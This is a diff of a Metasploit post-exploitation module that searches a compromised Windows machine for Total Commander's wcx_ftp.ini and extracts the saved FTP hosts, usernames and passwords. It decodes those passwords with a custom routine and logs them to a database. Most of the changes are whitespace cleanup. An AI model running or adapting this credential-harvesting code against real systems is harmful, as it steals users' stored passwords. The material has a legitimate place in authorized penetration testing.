@@ -31,20 +31,19 @@ class Metasploit3 < Msf::Post
 				'Platform'      => [ 'windows' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
-
 	end
 
 	def run
 		print_status("Checking Default Locations...")
 		check_systemroot
-		
+
 		grab_user_profiles().each do |user|
 			next if user['AppData'] == nil
 			next if user['ProfileDir'] == nil
 			check_userdir(user['ProfileDir'])
 			check_appdata(user['AppData'])
 		end
-		
+
 		commander_key = "HKLM\\Software\\Ghisler\\Total Commander"
 		hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
 		case hklmpath
@@ -80,7 +79,7 @@ class Metasploit3 < Msf::Post
 				check_other(hklminstpath +'\\wcx_ftp.ini')
 			when /APPDATA/
 				print_status("Already Checked AppData")
-				
+
 			when /USERPROFILE/
 				print_status("Already Checked USERPROFILE")
 			else
@@ -97,11 +96,11 @@ class Metasploit3 < Msf::Post
 		begin
 			iniexists = client.fs.file.stat(filename)
 			print_status("Found File at #{filename}")
-			get_ini(filename)			
+			get_ini(filename)
 
 		rescue
 			print_status("#{filename} not found ....")
-		end	
+		end
 
 	end
 
@@ -110,16 +109,15 @@ class Metasploit3 < Msf::Post
 		begin
 			iniexists = client.fs.file.stat(filename)
 			print_status("Found File at #{filename}")
-			get_ini(filename)			
+			get_ini(filename)
 
 		rescue
 			print_status("#{filename} not found ....")
-		end	
+		end
 
 	end
 
 	def check_systemroot
-		
 		winpath= client.fs.file.expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
 		begin
 			iniexists = client.fs.file.stat(winpath)
@@ -128,21 +126,18 @@ class Metasploit3 < Msf::Post
 		rescue
 			print_status("#{winpath} not found ....")
 		end
-		
 	end
 
 	def check_other(filename)
 		begin
 			iniexists = client.fs.file.stat(filename)
 			print_status("Found File at #{filename}")
-			get_ini(filename)			
+			get_ini(filename)
 
 		rescue
 			print_status("#{filename} not found ....")
-		end	
+		end
 	end
-
-	
 
 	def get_ini(filename)
 		config = client.fs.file.new(filename,'r')
@@ -153,7 +148,7 @@ class Metasploit3 < Msf::Post
 			next if group=="General" or group == "default" or group=="connections"
 			print_status("Processing Saved Session #{group}")
 			host = ini[group]['host']
-			
+
 			username = ini[group]['username']
 			passwd = ini[group]['password']
 			next if passwd==nil
@@ -165,13 +160,13 @@ class Metasploit3 < Msf::Post
 						:host  => host,
 						:port => port,
 						:sname => 'FTP',
+						:source_id => session.db_record.id,
+						:source_type => "exploit",
 						:user => username,
 						:pass => passwd
 					)
-	
 		end
-
-	end	
+	end
 
 	def seed(nMax)
 		@vseed = ((@vseed * 0x8088405) & 0xffffffff) +1
@@ -180,7 +175,7 @@ class Metasploit3 < Msf::Post
 
 	def shift(n1, n2)
 		first= (n1 << n2) & 0xffffffff
-		second = (n1 >> (8 - n2)) & 0xffffffff	
+		second = (n1 >> (8 - n2)) & 0xffffffff
 		retval= (first | second) &  0xff
 		return retval
 	end
@@ -206,7 +201,7 @@ class Metasploit3 < Msf::Post
 			a=seed(len)
 			b=seed(len)
 			t=pwd3[a]
-			pwd3[a] = pwd3[b]	
+			pwd3[a] = pwd3[b]
 			pwd3[b]=t
 		end
 
